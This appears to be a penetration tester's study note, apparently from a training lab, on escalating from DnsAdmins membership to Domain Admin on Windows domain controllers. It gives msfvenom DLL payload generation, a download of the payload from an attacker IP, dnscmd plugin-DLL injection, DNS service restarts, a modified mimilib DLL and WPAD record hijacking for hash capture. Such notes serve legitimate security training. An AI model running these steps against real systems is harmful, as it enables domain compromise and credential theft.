---
created: 2026-07-22
tags:
  - Windows
  - Windows_PrivEsc
status: substantial
---
## `DnsAdmins`

![[Windows groups#`DnsAdmins`]]

## `DnsAdmins` in privilege escalation

- Check whether the current user belongs to **`DnsAdmins`** (domain context):

```powershell
net user %USERNAME% /domain
```

- Or check a specific user:

```powershell
Get-ADGroupMember -Identity DnsAdmins
```

>[!example]-
> ```powershell
> PS C:\Users\netadm> Get-ADGroupMember -Identity DnsAdmins
> 
> distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
> name              : netadm
> objectClass       : user
> objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
> SamAccountName    : netadm
> SID               : S-1-5-21-669053619-2741956077-1013132368-1109
> ```

- Members of the `DnsAdmins` group do not have direct administrative privileges on the Domain Controller, but they are allowed to modify **DNS server configuration over RPC**.
- [`ServerLevelPluginDll`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows you to load a **custom plugin DLL** for name resolution. 
- The `ServerLevelPluginDll` configuration is stored in the registry at `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll`. Members of the `DnsAdmins` group don't have permissions to edit this registry key directory, but they can set it using the built-in [`dnscmd`](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) tool.
- Most importantly, **the path specified for this DLL is not checked or restricted**. Therefore, you can **specify an arbitrary DLL**, and as soon as the server restarts, it will load it.
- When a DLL is loaded, it executes within the memory space of the calling process. Since the DNS service (`dns.exe`) generally runs as `NT AUTHORITY\SYSTEM` on DCs, you get arbitrary code execution as `SYSTEM`.

## Escalating privileges via `ServerLevelPluginDll` configuration

1. Generate a DLL with your payload using `msfvenom` (for example, adding your user to the `Domain Admins` group):

```bash
msfvenom -p windows/x64/exec cmd='net group "Domain Admins" <username> /add /domain' -f dll -o adduser.dll
```

>[!example]-
> ```bash
> msfvenom -p windows/x64/exec cmd='net group "Domain Admins" netadm /add /domain' -f dll -o adduser.dll
> 
> [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
> [-] No arch selected, selecting arch: x64 from the payload
> No encoder specified, outputting raw payload
> Payload size: 313 bytes
> Final size of dll file: 9216 bytes
> Saved as: adduser.dll
> ```

2. Transfer the DLL to the target:

```bash
python -m http.server 8080
```

```powershell
wget "http://<attacker_ip_address>:8080/adduser.dll" -OutFile "adduser.dll"
```

```powershell
wget "http://10.10.14.228:8080/adduser.dll" -OutFile "adduser.dll"
```

3. Use `dnscmd` to specify the path to the DLL (membership in `DnsAdmins` lets you do that) using a UNC path:

```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\adduser.dll
```

>[!important] You must specify the **full path** to the custom DLL, otherwise the command won't work.

> [!example]+
> ```powershell
> PS C:\Users\netadm> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\adduser.dll
> 
> Registry property serverlevelplugindll successfully reset.
> Command completed successfully.
> ```

4. The custom DLL is only be loaded when the DNS service is started. Membership in `DnsAdmins` doesn't inherently grant permissions to restart the DNS service, so you may need to wait. However, sysadmins often grant this permission to DNS administrators. 

---

Check permissions to restart the DNS server:

- Find your user SID:

```cmd
wmic useraccount where "name='<username>'" get sid
```

- Use the `sc` command to check permissions on the `DNS` service: 

```powershell
sc.exe sdshow DNS
```

- If your SID (or the `DnsAdmins` group SID) has `RPWP` permissions in the output, it translates to `SERVICE_START` and `SERVICE_STOP`, meaning you can restart the service. 

---

- If you do have the permissions, restart the DNS service (using `sc` or `net` commands):

```powershell
sc.exe stop dns
```

```powershell
sc.exe start dns
```

>[!example]-
> ```powershell
> PS C:\Users\netadm> wmic useraccount where "name='netadm'" get sid
> 
> SID
> S-1-5-21-669053619-2741956077-1013132368-1109
> ```
> 
> ```powershell
> sc.exe sdshow DNS
> 
> D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)
> ```
> 
> ```powershell
> PS C:\Users\netadm> net stop dns
> The DNS Server service is stopping.
> The DNS Server service was stopped successfully.
> ```
> 
> ```powershell
> PS C:\Users\netadm> net start dns
> The DNS Server service is starting.
> The DNS Server service was started successfully.
> ```

>[!tip] You may need to authenticate again to generate a new token with the changed privileges. You can use `runas /user:<username> cmd.exe` for this.

>[!note] See [How to View and Modify Service Permissions in Windows](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/).

- If you don't have permissions to restart the service, you will have to wait for the server to be rebooted or for the service to be restarted by an administrator.
- Once the service restarts, your DLL is executed, and your user is added to `Domain Admins`. Verify membership:

```powershell
net group "Domain Admins" /domain
```

> [!example]-
> ```powershell
> PS C:\Users\netadm> net group "Domain Admins" /domain
> 
> Group name     Domain Admins
> Comment        Designated administrators of the domain
> 
> Members
> 
> -------------------------------------------------------------------------------
> Administrator            netadm
> The command completed successfully.
> ```

### Cleaning up

- Making configuration changes and stopping/restarting the DNS service on a Domain Controller are very destructive actions. You must clean up the registry to prevent the service from crashing on subsequent reboots.
- From an elevated prompt (now that you are a Domain Admin):

1. Confirm the `ServerLevelPluginDll` key exists:

```powershell
reg query \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

2. Delete the injected key:

```powershell
reg delete \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

3. Restart the DNS service once more to ensure it's running normally:

```powershell
sc.exe stop dns
sc.exe start dns
sc.exe query dns
```

## Privilege escalation via `mimilib.dll`

- Instead of `msfvenom`, you can use [`mimilib.dll`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of `Mimikatz`.
- By modifying the [`kdns.c`](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file, you can compile a DLL that executes a command of your choosing.

```c
/*  Benjamin DELPY `gentilkiwi`
    https://blog.gentilkiwi.com
    benjamin@gentilkiwi.com
    Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
    return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
    return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
    FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
    if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
    {
        klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
        fclose(kdns_logfile);
        system("ENTER COMMAND HERE");
    }
    return ERROR_SUCCESS;
}
```

>[!note] See [`Abusing DNSAdmins privilege for escalation in Active Directory — Lab of a Penetration Tester`](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html).

## Privilege escalation via WPAD record hijacking

- Another way to abuse `DnsAdmins` is by creating a **WPAD (Web Proxy Automatic Discovery Protocol)** record.
- By default, Windows Server blocks attempts to add `wpad` and `isatap` to DNS via a **global query block list** to prevent hijacking. However, `DnsAdmins` membership allows you to [disable this global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist).
- Once the block list is disabled, you can create a DNS record pointing `wpad` to your attacker machine.
- Every domain machine running WPAD with default settings will attempt to discover its proxy via DNS and have its traffic proxied through your machine. You can then use tools like [`Responder`](https://github.com/lgandx/Responder) or [`Inveigh`](https://github.com/Kevin-Robertson/Inveigh) to spoof traffic, capture NetNTLM hashes, or perform **SMB relay** attacks.

1. **Disable the global query block list**:

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName <DC_Hostname>
```

2. **Add a WPAD record**:

- Create an `A` record for `wpad` pointing to your attacker IP address:

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain_name> -ComputerName <DC_Hostname> -IPv4Address <attacker_IP>
```

## References and further reading

- [`DndAdmins — OSCP-CTPS NOTES`](https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/dnsadmins)
- [`Feature, not bug: DNSAdmin to DC compromise in one line — Shay Ber, Medium`](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)
- [`From DNSAdmins to Domain Admin, When DNSAdmins is More than Just DNS Administration — adsecurity.org`](https://adsecurity.org/?p=4064)
- [`How to View and Modify Service Permissions in Windows — Winhelponline`](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)
- [`Abusing DNSAdmins privilege for escalation in Active Directory — Lab of a Penetration Tester`](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)